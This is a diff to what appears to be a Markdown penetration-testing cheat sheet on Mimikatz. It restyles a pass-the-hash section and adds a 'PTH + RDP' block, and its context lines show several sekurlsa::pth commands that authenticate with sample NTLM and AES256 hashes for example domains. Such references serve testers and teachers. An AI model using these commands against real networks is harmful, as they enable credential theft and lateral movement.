@@ -169,13 +169,19 @@ LSADUMP::SetNTLM –> Ask a server to set a new password/ntlm for one user.
 
 ​LSADUMP::Trust –> Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly).</code></pre>
 
-pass the hash
+### <mark style="color:orange;">pass the hash</mark>
 
 ```tsconfig
 sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a
 sekurlsa::pth /user:Administrateur /domain:chocolate.local /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
 sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
 sekurlsa::pth /user:Administrator /domain:WOSHUB /ntlm:{NTLM_hash} /run:cmd.exe
+```
+
+### <mark style="color:orange;">PTH + RDP</mark>
+
+```tsconfig
+sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:"mstsc.exe /restrictedadmin"
 ```
 
 ### <mark style="color:orange;">Tokens</mark>
